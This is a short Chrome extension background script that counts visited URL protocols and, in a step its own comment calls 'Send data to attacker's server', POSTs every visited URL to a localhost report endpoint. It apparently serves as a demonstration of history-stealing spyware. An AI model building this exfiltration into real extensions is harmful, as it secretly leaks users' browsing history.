// background.js
let pageStats = {};

chrome.tabs.onCreated.addListener((tab) => {
    addUrlToStorage(tab.url);
});
  
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    console.log("onUpdated", { tabId, changeInfo, tab });
    if (changeInfo.status === "complete") {
        addUrlToStorage(tab.url);
    }
});


async function addUrlToStorage (url){
    try {
        if (!url ) {
            return;
        }
        console.log({url});
        
        
        const protocol = new URL(url).protocol;
        
        if (!pageStats[protocol]) {
            pageStats[protocol] = {
                count: 0,
                lastVisited: null,
            };
        }
        
        pageStats[protocol].count++;
        pageStats[protocol].lastVisited = new Date().toISOString();
        console.log({pageStats});
        
        // Send data to attacker's server
        const response = await fetch("http://localhost:8080/report", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ url }),
        });
        const data = await response.json();
        console.log({ data });
        
        
        // Store stats in local storage
        chrome.storage.local.set({ pageStats });
        
    } catch (error) {
        console.error({
            message: "Error in addUrlToStorage",
            error,
            url,
        });
        
    }
}
